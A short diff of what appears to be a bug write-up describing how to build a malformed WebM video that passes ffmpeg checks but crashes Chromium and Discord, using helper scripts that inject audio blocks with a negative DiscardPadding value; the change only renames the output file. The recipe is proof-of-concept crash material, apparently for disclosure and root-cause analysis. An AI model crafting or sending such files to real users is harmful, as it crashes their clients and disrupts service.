@@ -50,13 +50,13 @@ python mkv_add_codecdelay.py clean.webm step2.webm
 
 # 3. Wrap 3 mid-stream, full-size (1024-sample) audio blocks into BlockGroups
 #    with a negative DiscardPadding (-1025 samples).
-python mkv_inject_crash.py step2.webm crash.webm --start-index 200 --count 3 --min-step-ms 15
+python mkv_inject_crash.py step2.webm crash_129.webm --start-index 200 --count 3 --min-step-ms 15
 ```
 
 ### Result
 
-- `ffmpeg -v error -i crash.webm -f null -` → **no errors**.
-- Opening `crash.webm` in Chromium / Discord → **crash**.
+- `ffmpeg -v error -i crash_129.webm -f null -` → **no errors**.
+- Opening `crash_129.webm` in Chromium / Discord → **crash**.
 
 ## Root cause
 
